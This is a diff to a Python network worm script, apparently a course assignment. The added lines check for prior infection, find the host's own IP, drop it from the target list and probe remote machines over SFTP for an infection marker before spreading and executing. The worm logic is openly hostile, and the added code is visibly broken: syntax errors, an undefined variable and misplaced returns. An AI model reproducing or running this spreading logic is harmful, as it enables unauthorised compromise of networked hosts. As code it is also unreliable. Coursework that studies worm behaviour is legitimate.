@@ -224,9 +224,13 @@ if len(sys.argv) < 2:
 	
 	# TODO: If we are running on the victim, check if 
 	# the victim was already infected. If so, terminate.
-	# Otherwise, proceed with malice. 
-	pass
+	# Otherwise, proceed with malice.
+	if isInfectedSystem()
+		return 0;
+	else:
+		pass
 # TODO: Get the IP of the current system
+ myIP =getMyIP("enp0s3")
 
 
 
@@ -236,6 +240,8 @@ networkHosts = getHostsOnTheSameNetwork()
 # TODO: Remove the IP of the current system
 # from the list of discovered systems (we
 # do not want to target ourselves!).
+networkHosts.remove(myIP)
+
 
 print "Found hosts: ", networkHosts
 
@@ -281,6 +287,14 @@ for host in networkHosts:
 		# If the system was already infected proceed.
 		# Otherwise, infect the system and terminate.
 		# Infect that system
+
+		try:
+			remotepath = 'tmp/infected.txt'
+			localpath ='/home/cpsc'
+			sftp.get(filepath, localpath)
+		except IOError:
+			print ("This system should already be infected")
+
 		spreadAndExecute(sshInfo[0])
 		
 		print "Spreading complete"	
